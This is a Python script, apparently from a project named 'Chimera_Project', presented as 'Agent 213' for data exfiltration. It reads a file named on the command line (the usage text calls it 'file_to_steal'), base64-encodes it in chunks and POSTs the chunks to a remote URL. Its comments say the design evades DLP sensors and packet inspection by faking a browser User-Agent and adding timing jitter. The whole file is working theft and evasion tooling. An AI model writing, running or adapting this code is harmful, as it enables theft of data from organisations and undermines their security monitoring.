#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import time
import base64
import requests
from datetime import datetime

class DataExfiltrator:
    """
    Agent 213: Tactical Data Exfiltration.
    Uses chunked, encrypted HTTPS POST requests to bypass 
    network-level Data Loss Prevention (DLP) sensors.
    """
    def __init__(self, target_file, remote_url):
        self.file_path = target_file
        self.remote_url = remote_url
        self.chunk_size = 1024 * 1024 # 1MB Chunks

    def exfiltrate(self):
        print(f"--- [AGENT 213: DATA EXFILTRATION - {os.path.basename(self.file_path)}] ---")
        
        if not os.path.exists(self.file_path):
            print(f"[!] Error: File {self.file_path} not found.")
            return False

        file_size = os.path.getsize(self.file_path)
        print(f"[*] Total Size: {file_size / 1024:.2f} KB. Starting chunked transfer...")

        try:
            with open(self.file_path, 'rb') as f:
                chunk_idx = 0
                while True:
                    chunk = f.read(self.chunk_size)
                    if not chunk:
                        break
                    
                    # Encode chunk to Base64 to bypass deep packet inspection of binary data
                    encoded_chunk = base64.b64encode(chunk).decode()
                    
                    # Transmit over HTTPS
                    payload = {
                        "id": os.path.basename(self.file_path),
                        "seq": chunk_idx,
                        "data": encoded_chunk
                    }
                    
                    # Using a common User-Agent to blend in with browser traffic
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
                    requests.post(self.remote_url, json=payload, headers=headers, timeout=10)
                    
                    print(f"    [+] Chunk {chunk_idx} transmitted.")
                    chunk_idx += 1
                    
                    # Jitter delay to avoid 'Traffic Burst' detection
                    time.sleep(random.uniform(0.5, 2.0))
            
            print("[!!!] EXFILTRATION COMPLETE.")
            return True
        except Exception as e:
            print(f"[!] Exfiltration Error: {e}")
            return False

if __name__ == "__main__":
    import random # needed for jitter
    if len(sys.argv) < 3:
        print("Usage: ./main.py <file_to_steal> <remote_https_url>")
        sys.exit(1)
        
    DataExfiltrator(sys.argv[1], sys.argv[2]).exfiltrate()
